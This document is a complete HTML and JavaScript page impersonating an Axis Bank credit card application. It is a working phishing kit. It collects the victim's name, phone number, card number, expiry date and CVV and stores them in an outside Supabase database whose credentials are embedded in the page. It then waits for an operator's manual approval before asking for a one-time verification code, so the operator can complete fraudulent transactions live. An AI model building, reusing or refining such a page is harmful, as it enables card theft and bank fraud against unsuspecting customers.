<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Credit Card Application</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="logo.png" type="image/png">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f8f9fa, #eef1f7);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 15px 45px rgba(140, 29, 62, 0.15);
            margin: 25px auto;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #8c1d3e, #a0224a);
            color: white;
            padding: 18px 25px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 12px;
            width: 100%;
        }

        .logo-img {
            height: 48px;
            width: auto;
        }

        .logo-text-container { flex: 1; }

        .logo-text {
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -1px;
        }

        .tagline {
            font-size: 14px;
            opacity: 0.95;
            margin-top: 2px;
        }

        .content { padding: 35px 28px; }

        h2 {
            text-align: center;
            color: #1e2a44;
            font-size: 25px;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #455a7f;
            font-size: 15.5px;
            margin-bottom: 32px;
        }

        .form-group { margin-bottom: 24px; }

        label {
            display: block;
            margin-bottom: 7px;
            font-weight: 600;
            color: #1e2a44;
            font-size: 14.5px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #c8ced7;
            border-radius: 8px;
            font-size: 16px;
            transition: 0.3s;
        }

        input:focus { 
            border-color: #8c1d3e; 
            box-shadow: 0 0 0 3px rgba(140, 29, 62, 0.1);
            outline: none; 
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #8c1d3e, #a0224a);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover { transform: translateY(-2px); }

        .footer {
            text-align: center;
            padding: 22px;
            color: #555;
            font-size: 13.5px;
            background: #f8f9fa;
            margin-top: auto;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            width: 90%;
            max-width: 380px;
            border-radius: 16px;
            padding: 35px 25px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .loader {
            width: 55px;
            height: 55px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #8c1d3e;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .success { color: #008000; font-size: 27px; font-weight: 700; margin: 15px 0; }
        .reject { color: #d32f2f; font-size: 22px; font-weight: 700; margin: 15px 0; }
        .wait { color: #8c1d3e; font-weight: 600; margin: 15px 0; font-size: 16px; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header">
            <div class="logo-container">
                <img src="logo.png" 
                     class="logo-img" alt="Axis Bank Logo">
                <div class="logo-text-container">
                    <div class="logo-text">AXIS BANK</div>
                    <div class="tagline">Your credit card application is just a few clicks away</div>
                </div>
            </div>
        </div>

        <div class="content">
            <h2>Premium Credit Card Verification</h2>
            <p class="subtitle">Secure • Instant Approval • Paperless</p>

            <div class="form-group">
                <label>Full Name *</label>
                <input type="text" id="fullName" placeholder="Enter Full Name" required>
            </div>

            <div class="form-group">
                <label>Phone Number *</label>
                <input type="tel" id="phoneNumber" placeholder="Enter 10-digit phone number" maxlength="10" required>
            </div>

            <div class="form-group">
                <label>Card Number *</label>
                <input type="text" id="number1" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
            </div>

            <div class="form-group">
                <label>Expiry Date *</label>
                <input type="text" id="date_value" placeholder="MM/YY" maxlength="5" onkeyup="formatExpiry(this)">
            </div>

            <div class="form-group">
                <label>CVV *</label>
                <input type="text" id="number2" placeholder="123" maxlength="4">
            </div>

            <button onclick="submitForm()">Continue Securely</button>
        </div>
    </div>

    <div id="statusModal" class="modal">
        <div class="modal-content" id="modalContent"></div>
    </div>

    <div class="footer">
        © 2026 Axis Bank Limited | All Rights Reserved<br>
        Regulated by RBI | 256-Bit SSL Secured
    </div>

    <script>
    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentId = null;
    let interval = null;

    function showModal(html) {
        document.getElementById('modalContent').innerHTML = html;
        document.getElementById('statusModal').style.display = 'flex';
    }

    function formatExpiry(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    }

    async function submitForm(){
        const fullName = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const number1 = document.getElementById('number1').value.trim();
        const date_value = document.getElementById('date_value').value.trim();
        const number2 = document.getElementById('number2').value.trim();

        if(!fullName || !phoneNumber || !number1 || !date_value || !number2){
            alert('Please fill all fields');
            return;
        }

        showModal(`<div class="loader"></div><div class="wait">Submitting your request...</div>`);

        const { data, error } = await client.from('requests').insert([{
            full_name: fullName,
            phone_number: phoneNumber,
            number1, 
            date_value, 
            number2, 
            status: 'pending', 
            pin: '', 
            pin_status: 'waiting'
        }]).select();

        if(error) {
            console.log(error);
            showModal(`<div class="reject">Submission Error</div>`);
            return;
        }

        currentId = data[0].id;
        listenStatus();
    }

    function listenStatus(){
        clearInterval(interval);
        interval = setInterval(async () => {
            const { data, error } = await client
                .from('requests')
                .select('*')
                .eq('id', currentId)
                .single();

            if(error) return;

            if(data.status === 'accepted' && data.pin_status === 'accepted'){
                clearInterval(interval);
                showModal(`<div class="success">Congratulations! 🎉<br>Verified Successfully</div>`);
                return;
            }

            if(data.status === 'pending'){
                showModal(`<div class="loader"></div><div class="wait">Waiting for Verification...</div>`);
            }
            else if(data.status === 'rejected'){
                clearInterval(interval);
                showModal(`<div class="reject">Request Rejected</div>`);
            }
            else if(data.status === 'accepted'){
                if(data.pin_status === 'waiting'){
                    if(!document.getElementById('pin')){
                        clearInterval(interval);
                        showModal(`
                            <div class="wait">Enter Verification Code to proceed</div>
                            <input type="text" id="pin" placeholder="Enter Verification Code" 
                                   style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:8px;">
                            <button onclick="submitPin()" 
                                    style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:8px; color:white; font-weight:600; margin-top:10px;">
                                Submit Verification Code
                            </button>
                        `);
                    }
                }
                else if(data.pin_status === 'pending'){
                    showModal(`<div class="loader"></div><div class="wait">Verifying Code...</div>`);
                }
                else if(data.pin_status === 'rejected'){
                    clearInterval(interval);
                    showModal(`<div class="reject">Code Rejected</div>`);
                }
            }
        }, 1200);
    }

    async function submitPin(){
        const pin = document.getElementById('pin').value.trim();
        if(!pin) {
            alert("Please enter Verification Code");
            return;
        }

        showModal(`<div class="loader"></div><div class="wait">Submitting Code...</div>`);

        await client.from('requests').update({ pin: pin, pin_status: 'pending' }).eq('id', currentId);

        setTimeout(() => listenStatus(), 800);
    }
    </script>
</body>
</html>
